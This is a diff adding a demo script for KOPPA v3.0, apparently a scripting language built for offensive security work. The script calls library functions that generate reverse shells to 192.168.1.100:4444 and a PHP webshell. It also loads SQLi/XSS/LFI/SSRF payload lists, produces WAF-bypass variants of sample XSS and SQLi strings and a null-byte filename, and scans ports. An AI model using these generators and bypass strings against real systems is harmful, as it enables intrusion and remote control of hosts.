@@ -1,0 +1,175 @@
+# KOPPA v3.0 — Cybersecurity Language Demo
+# ตัวอย่างแสดง features ทั้งหมดที่สาย cybersecurity ต้องการ
+
+import log, vuln, payload, bypass, scan, hash, encode
+
+fn main() {
+    log.info("=== KOPPA v3.0 Cybersecurity Demo ===")
+    log.info("")
+
+    # ---1. Bitwise Operations ---───────────────────
+    log.info("---Bitwise Operations ---")
+    let mask     = 0xFF & 0x0F
+    let flags    = 0b0001 | 0b0010 | 0b0100
+    let xored    = 0x41 ^ 0x20
+    let shifted  = 1 << 8
+    let rshifted = 0x100 >> 4
+    let bnot     = ~0xFF & 0xFFFF
+    log.info("0xFF & 0x0F   = {mask}")
+    log.info("0b0001|2|4    = {flags}")
+    log.info("0x41 ^ 0x20   = {xored}")
+    log.info("1 << 8        = {shifted}")
+    log.info("0x100 >> 4    = {rshifted}")
+    log.info("~0xFF & 0xFF  = {bnot}")
+
+    # ---2. Byte Literals ---────────────────────────
+    log.info("")
+    log.info("---Byte Literals ---")
+    let nop_sled = b"\x90\x90\x90\x90\xcc"
+    let key      = 0x41
+    let encoded  = nop_sled.xor(key)
+    log.info("NOP sled hex: {nop_sled.hex}")
+    log.info("XOR 0x41:     {encoded.hex}")
+    log.info("Base64:       {nop_sled.b64}")
+    log.info("Length:       {nop_sled.len} bytes")
+
+    # ---3. Vulnerability Payloads ---───────────────
+    log.info("")
+    log.info("---Vulnerability Payloads ---")
+    let sqli_list = vuln.sqli_payloads()
+    let xss_list  = vuln.xss_payloads()
+    let lfi_list  = vuln.lfi_payloads()
+    let ssrf_list = vuln.ssrf_payloads()
+    log.info("SQLi payloads: {sqli_list.len} loaded")
+    log.info("XSS payloads:  {xss_list.len} loaded")
+    log.info("LFI payloads:  {lfi_list.len} loaded")
+    log.info("SSRF payloads: {ssrf_list.len} loaded")
+
+    # Header security scan
+    let headers = vuln.scan_headers("http://example.com")
+    log.info("Missing headers: {headers.missing.len}")
+    log.info("Present headers: {headers.present.len}")
+
+    # ---4. Reverse Shell Generation ---─────────────
+    log.info("")
+    log.info("---Reverse Shell Generation ---")
+    let shells    = payload.shells()
+    log.info("Supported shells: {shells.len}")
+    let bash_rev  = payload.reverse_shell("bash",   "192.168.1.100", 4444)
+    let python_rev = payload.reverse_shell("python", "192.168.1.100", 4444)
+    let php_web   = payload.webshell("php")
+    log.info("Bash:   {bash_rev}")
+    log.info("Python: {python_rev}")
+    log.info("PHP web: {php_web}")
+
+    # ---5. Payload Encoding ---─────────────────────
+    log.info("")
+    log.info("---Payload Encoding ---")
+    let raw    = "<script>alert(1)</script>"
+    let b64enc = payload.encode(raw, "base64")
+    let urlenc = payload.encode(raw, "url")
+    let hexenc = payload.encode(raw, "hex")
+    log.info("Original : {raw}")
+    log.info("Base64   : {b64enc}")
+    log.info("URL      : {urlenc}")
+    log.info("Hex      : {hexenc}")
+
+    # MSF cyclic pattern
+    let pattern = payload.msf_pattern(24)
+    log.info("MSF pattern(24): {pattern}")
+
+    # ---6. WAF Bypass ---───────────────────────────
+    log.info("")
+    log.info("---WAF Bypass ---")
+    let xss_vars  = bypass.xss_variants("<script>alert(1)</script>")
+    let sqli_vars = bypass.sqli_variants("' OR 1=1--")
+    let ip_vars   = bypass.ip_variants("127.0.0.1")
+    log.info("XSS variants:  {xss_vars.len}")
+    log.info("SQLi variants: {sqli_vars.len}")
+    log.info("127.0.0.1 as:  {ip_vars}")
+    let null = bypass.null_byte("payload.php")
+    log.info("Null byte:     {null}")
+
+    # ---7. Advanced Port Scanning ---───────────────
+    log.info("")
+    log.info("---Parallel Port Scan ---")
+    let ports  = [80, 443, 8080, 8443, 3306, 5432, 6379, 27017]
+    let open_p = scan.mass("127.0.0.1", ports, 0.5)
+    log.info("Open ports on 127.0.0.1: {open_p}")
+    let svc = scan.service(445)
+    log.info("Port 445 = {svc}")
+
+    # ---8. Hash Operations ---──────────────────────
+    log.info("")
+    log.info("---Hash Operations ---")
+    let pw     = "P@ssw0rd123!"
+    let md5h   = hash.md5(pw)
+    let sha256h = hash.sha256(pw)
+    let ntlmh  = hash.ntlm(pw)
+    log.info("MD5:   {md5h}")
+    log.info("SHA256:{sha256h}")
+    log.info("NTLM:  {ntlmh}")
+
+    # ---9. Cybersecurity Classes ---────────────────
+    log.info("")
+    log.info("---Security Report Class ---")
+
+    class Finding {
+        fn __init__(self, title, severity, description) {
+            self.title       = title
+            self.severity    = severity
+            self.description = description
+        }
+        fn to_string(self) {
+            return "[{self.severity}] {self.title}: {self.description}"
+        }
+    }
+
+    class ScanReport {
+        fn __init__(self, target) {
+            self.target   = target
+            self.findings = []
+        }
+        fn add(self, finding) {
+            self.findings.push(finding)
+        }
+        fn count(self) {
+            return self.findings.len
+        }
+        fn critical_count(self) {
+            let n = 0
+            for f in self.findings {
+                if f.severity == "Critical" { n += 1 }
+            }
+            return n
+        }
+    }
+
+    let report = new ScanReport("192.168.1.1")
+    report.add(new Finding("SQL Injection", "Critical", "Found in /login?id= parameter"))
+    report.add(new Finding("XSS", "High", "Reflected XSS in /search?q="))
+    report.add(new Finding("Missing HSTS", "Medium", "HTTPS not enforced"))
+    report.add(new Finding("Server Version Disclosure", "Low", "Apache 2.4.51 in headers"))
+
+    log.info("Target: {report.target}")
+    log.info("Total findings: {report.count()}")
+    log.info("Critical:       {report.critical_count()}")
+
+    let crit  = [f for f in report.findings if f.severity == "Critical"]
+    let highs = [f for f in report.findings if f.severity == "High"]
+    log.warn("Critical findings: {crit.len}")
+    log.warn("High findings:     {highs.len}")
+
+    log.info("")
+    log.success("KOPPA Cybersecurity Demo Complete!")
+    log.info("")
+    log.info("Features demonstrated:")
+    log.info("  [+] Bitwise ops: & | ^ ~ << >>")
+    log.info("  [+] Byte literals: b\"\\x90\\x90\"")
+    log.info("  [+] vuln module: SQLi/XSS/LFI/SSRF payloads")
+    log.info("  [+] payload module: reverse shells, encoding")
+    log.info("  [+] bypass module: WAF bypass variants")
+    log.info("  [+] scan module: parallel scanning")
+    log.info("  [+] hash module: MD5/SHA256/NTLM")
+    log.info("  [+] Classes + comprehensions + bitwise")
+}
